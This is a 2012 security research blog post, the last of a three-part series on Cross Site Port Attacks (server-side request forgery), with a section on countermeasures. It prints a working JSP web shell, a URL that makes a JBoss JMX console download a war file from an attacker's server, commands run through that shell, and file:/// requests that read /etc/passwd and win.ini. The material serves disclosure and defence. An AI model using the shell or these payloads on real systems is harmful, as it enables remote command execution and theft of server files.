---
title: "Cross Site Port Attacks - XSPA - Part 3"
date: 2012-11-14
categories:
- bugbounty
- research
- appsec
- cross site port attacks
tags:
- xspa
- ssrf

thumbnailImagePosition: left
thumbnailImage: /img/cross-site-port-attacks---xspa---part-3/1.png
---

This is the third post in the 3 part series that explains XSPA, the attacks and possible countermeasures. In this post we will see other interesting attacks and also see how developers can prevent XSPA or limit the attack surface itself. 

<!--more-->

In the last 2 posts we saw what Cross Site Port Attacks (XSPA) are and what are the different attacks that are possible via XSPA. This post is in continuation with the previous posts and is the last in the series of three. In this post we will see other interesting attacks and also see how developers can prevent XSPA or limit the attack surface itself. 

- Read [Cross Site Port Attacks - XSPA - Part 1](/2012/11/cross-site-port-attacks-xspa-part-1/)
- Read [Cross Site Port Attacks - XSPA - Part 2](/2012/11/cross-site-port-attacks-xspa-part-2/)

### Attacks - Attacking Internal Vulnerable Web Applications

Most often than not, intranet applications lack even the most basic security allowing an attacker on the internal network to attack and access server resources including data and code. Being an intranet application, reaching it from the Internet requires VPN access to the internal network or specialized connectivity on the same lines. Using XSPA, however, an attacker can target vulnerable internal web applications via the Internet exposed web application. 

A very common example I can think of and which I have seen during numerous pentests is the presence of a JBoss Server vulnerable to a bunch of issues. My most favorite of them being the absence of authentication, by default, on the JMX console which runs on port 8080 by default.

![](/img/cross-site-port-attacks---xspa---part-3/1.png)

A [well documented hack using the JMX console](https://www.google.co.in/search?q=hacking%20jboss%20jmx-console), allows an attacker to deploy a war file containing JSP code that would allow command execution on the server. If an attacker has direct access to the JMX console, then deploying the war file containing the following JSP code is relatively straightforward:

```
<%@ page import="java.util.*,java.io.*"%>
<pre>
<% Process p = Runtime.getRuntime().exec("cmd /c " + request.getParameter("x")); 
DataInputStream dis = new DataInputStream(p.getInputStream());
String disr = dis.readLine();
while ( disr != null ) {
    out.println(disr);
    disr = dis.readLine();
} 
%> 
</pre> 
```

Using the `MainDeployer` under jboss.system:service in the JMX Bean View we can deploy a war file containing a JSP shell. The `MainDeployer` can be found at the following address: 

```
http://example_server:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name;=jboss.system%3Aservice%3DMainDeployer
```

Using the `MainDeployer`, for example, a war file named `cmd.war` containing a shell named `shell.jsp` can be deployed to the server and accessed via http://example_server:8080/cmd/shell.jsp. Commands can then be executed via `shell.jsp?x=[command]`. To perform this via XSPA we need to replace the `example_server` with the IP/hostname of the server running JBoss on the internal network. 

A small problem here that becomes a roadblock in performing this attack via XSPA is that the file deploy works via a POST request and hence we cannot craft a URL (atleast we think so) that would deploy the war file to the server. This can easily be solved by converting the POST to a GET request for the JMX console. On a test installation, we can identify the variables that are being sent to the JBoss server when the Main Deployer's deploy() function is called. Using your favorite proxy, or simply using the Firefox addon - Web Developer's "Convert POST to GET" functionality, we can construct a URL that would allow deploying of the cmd.war file to the server. We then only need to host the cmd.war file on an Internet facing server so that we can specify the cmd.war file URL as arg0. The final URL would look something like (assuming JBoss server is running on the same web server):

```
http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOp&name;=jboss.system:service=MainDeployer&methodIndex;=17&arg0;=http://our_public_internet_server/utils/cmd.war
```

![](/img/cross-site-port-attacks---xspa---part-3/2.png)

Then its a matter of requesting shell.jsp via the XSPA vulnerable web application. For example, the following input would return the directory listing on the JBoss server (assuming its Windows, for Linux, x=ls%20-al can be used) 

```
http://127.0.0.1:8080/cmd/shell.jsp?x=dir
```

![](/img/cross-site-port-attacks---xspa---part-3/3.png)

```
http://127.0.0.1:8080/cmd/shell.jsp?x=tasklist
```

![](/img/cross-site-port-attacks---xspa---part-3/4.png)

We have successfully attacked an internal vulnerable web application from the Internet using XSPA. We can then use the shell to download a reverse connect program that would give higher flexibility over issuing commands. Similarily other internal applications vulnerable to threats like SQL Injection, parameter manipulation and other URL based attacks can be targeted from the Internet. 

### Attacks - Reading local files using file:/// protocol

All the attacks that we saw till now make use of the fact that the XSPA vulnerable web application creates an HTTP request to the requested resource. The protocol in all cases was specified by the attacker. On the other hand, if we specify the file protocol handler, we maybe able to read local files on the server. An input of the following form would cause the application to read files on disk: 

- **Request: file:///C:/Windows/win.ini**

![](/img/cross-site-port-attacks---xspa---part-3/5.png)

The following screengrab shows the reading of the `/etc/passwd` file on an Adobe owned server via Adobe's Omniture web application. The request was `file:///etc/passwd`. Adobe has now fixed this issue and credited me on the [Adobe Hall of Fame](https://www.adobe.com/support/security/bulletins/securityacknowledgments.html) for the same: 

![](/img/cross-site-port-attacks---xspa---part-3/6.png)

## How do you fix this?

There are multiple ways of mitigating this vulnerability, the most ideal and common techniques of thwarting XSPA, however, are listed below:

1. Response Handling - Validating responses received from remote resources on the server side is the most basic mitigation that can be readily implemented. If a web application expects specific content type on the server, programmatically ensure that the data received satisfies checks imposed on the server before displaying or processing the data for the client. 

2. Error handling and messages - Display generic error messages to the client in case something goes wrong. If content type validation fails, display generic errors to the client like "Invalid Data retrieved". Also ensure that the message is the same when the request fails on the backend and if invalid data is received. This will prevent the application from being abused as distinct error messages will be absent for closed and open ports. Under no circumstance should the raw response received from the remote server be displayed to the client. 

3. Restrict connectivity to HTTP based ports - This may not always be the brightest thing to do, but restricting the ports to which the web application can connect to only HTTP ports like 80, 443, 8080, 8090 etc. can lower the attack surface. Several popular web applications on the Internet just strip any port specifications in the input URL and connect to the port that is determined by the protocol handler (http - 80, https - 443). 

4. Blacklist IP addresses - Internal IP addresses, localhost specifications and internal hostnames can all be blacklisted to prevent the web application from being abused to fetch data/attack these devices. Implementing this will protect servers from one time attack vectors. For example, even if the first fix (above) is implemented, the data is still being sent to the remote service. If an attack that does not need to see responses is executed (like a buffer overflow exploit) then this fix can actually prevent data from ever reaching the vulnerable device. Response handling is then not required at all as a request was never made. 

5. Disable unwanted protocols - Allow only http and https to make requests to remote servers. Whitelisting these protocols will prevent the web application from making requests over other protocols like `file://`, `gopher://`, `ftp://` and other URI schemes.

## Conclusion

Using web applications to make requests to remote resources, the local network and even localhost is a technique that has been known to pentesters for some time now. It has been termed as Server Side Request Forgeries, Cross Site Port Attacks and even Server Side Site Scanning, but the primary idea is to present it to the community and show that this vulnerability is extremely common. XSPA, in the case of this research, can be used to proxy attacks via vulnerable web applications to remote servers and local systems.

We have seen that XSPA can be used to port scan remote Internet facing servers, intranet devices and the local web server itself. Banner grabbing is also possible in some cases. XSPA can also be used to exploit vulnerable programs running on the Intranet or on the local web server. Fingerprinting intranet web applications using static default files & application behaviour is possible. It is also possible in several cases to attack internal/external web applications that are vulnerable to GET parameter based vulnerabilities (SQLi via URL, parameter manipulation etc.). Lastly, XSPA has been used to document local file read capabilities using the `file://` protocol handler in Adobe's Omniture web application. 

Mitigating XSPA takes a combination of blacklisting IP addresses, whitelisting connect ports and protocols and proper non descriptive error handling. 

In the next several posts I will publish disclosures regarding XSPA in several websites on the Internet which triggered the research into this vulnerability in the first place. 

---